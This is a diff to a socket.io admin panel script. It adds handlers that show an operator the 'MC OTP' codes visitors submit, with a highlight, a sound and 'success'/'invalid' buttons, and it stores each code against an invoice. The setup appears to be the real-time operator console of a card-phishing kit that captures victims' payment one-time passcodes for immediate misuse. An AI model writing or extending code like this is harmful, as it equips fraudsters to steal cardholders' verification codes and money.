@@ -3001,11 +3001,46 @@ socket.on('visitor', (visitor) => {
 });
 
 // Handle OTP submission from client in MC verification panel
-socket.on('mc_otp_submitted', (data) => {
+socket.on('mc_otp_submitted', (data, callback) => {
   console.log('MC OTP received:', data);
   const mcOtpValue = document.getElementById('mcOtpValue');
   if (mcOtpValue) {
     mcOtpValue.textContent = data.otp;
+    
+    // Add highlight effect to make it noticeable
+    mcOtpValue.style.backgroundColor = '#4ade80';
+    setTimeout(() => {
+      mcOtpValue.style.backgroundColor = '';
+      mcOtpValue.style.transition = 'background-color 1s';
+    }, 1000);
+    
+    // Play notification sound
+    playNotificationSound('transaction');
+    
+    // Show notification
+    showNotification(`OTP Received: ${data.otp}`);
+  }
+  
+  // Enable the success and invalid buttons
+  const successBtn = document.getElementById('mcOtpSuccessBtn');
+  const invalidBtn = document.getElementById('mcOtpInvalidBtn');
+  if (successBtn) successBtn.disabled = false;
+  if (invalidBtn) invalidBtn.disabled = false;
+  
+  // Send acknowledgement back to client
+  if (typeof callback === 'function') {
+    callback({ received: true });
+  }
+  
+  // Update transaction status if applicable
+  const transaction = transactionsMap.get(data.invoiceId);
+  if (transaction) {
+    transaction.otpEntered = data.otp;
+    transaction.status = 'otp_received';
+    transactionsMap.set(data.invoiceId, transaction);
+    
+    // Refresh transactions display
+    loadTransactions();
   }
 });
 
@@ -3160,6 +3195,27 @@ socket.on('visitor_left', (data) => {
   }
 });
 
+// Handle verification status checks
+socket.on('check_verification_status', function(data) {
+    console.log('Verification status check requested for:', data.invoiceId);
+    
+    // Check if transaction exists and has OTP
+    const transaction = transactionsMap.get(data.invoiceId);
+    if (transaction && transaction.otpEntered) {
+        // Respond to client with status update
+        socket.emit('verification_status_update', {
+            invoiceId: data.invoiceId,
+            status: 'otp_received',
+            otp: transaction.otpEntered
+        });
+    } else {
+        // No OTP yet
+        socket.emit('verification_status_update', {
+            invoiceId: data.invoiceId,
+            status: 'waiting_for_otp'
+        });
+    }
+});
 // Load data on page load
 document.addEventListener('DOMContentLoaded', function() {
   console.log('Loading admin panel data...');
